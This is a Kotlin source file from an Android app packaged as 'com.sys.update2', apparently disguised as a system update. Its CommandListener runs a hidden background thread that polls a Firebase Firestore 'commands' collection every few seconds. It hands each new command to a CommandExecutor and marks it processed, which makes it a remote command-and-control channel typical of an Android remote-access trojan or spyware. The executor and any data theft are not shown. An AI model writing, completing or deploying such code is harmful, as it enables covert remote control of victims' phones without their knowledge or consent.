package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var worker: Thread? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    private val FS_COMMANDS =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/commands"

    fun start(ctx: Context) {
        if (running) return
        running = true

        worker = thread(name = "firestore-cmd-poll") {
            while (running) {
                try {
                    pollCommands(ctx)
                    Thread.sleep(3000)
                } catch (e: Exception) {
                    Log.e("CmdListener", "loop err: ${e.message}")
                    Thread.sleep(5000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun pollCommands(ctx: Context) {
        try {
            val url = "$FS_COMMANDS?key=${Config.FIREBASE_API_KEY}&pageSize=20"
            val req = Request.Builder().url(url).get().build()

            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string() ?: return
                val obj = JSONObject(body)
                val docs = obj.optJSONArray("documents") ?: return

                for (i in 0 until docs.length()) {
                    val doc = docs.optJSONObject(i) ?: continue
                    val name = doc.optString("name", "")
                    val fields = doc.optJSONObject("fields") ?: continue

                    val text = fields.optJSONObject("text")?.optString("stringValue") ?: ""
                    val processed = fields.optJSONObject("processed")?.optBoolean("booleanValue") ?: false

                    if (text.isBlank() || processed) continue

                    try {
                        CommandExecutor.handleText(ctx, text)
                    } catch (e: Exception) {
                        Log.e("CmdListener", "exec err: ${e.message}")
                    }

                    markProcessed(name)
                }
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "poll err: ${e.message}")
        }
    }

    private fun markProcessed(docName: String) {
        try {
            val docId = docName.substringAfterLast("/")
            val url = "$FS_COMMANDS/$docId?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=processed"
            val fields = JSONObject().apply {
                put("processed", JSONObject().put("booleanValue", true))
            }
            val body = JSONObject().apply { put("fields", fields) }.toString()
            val req = Request.Builder()
                .url(url)
                .patch(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { }
        } catch (_: Exception) {}
    }
}
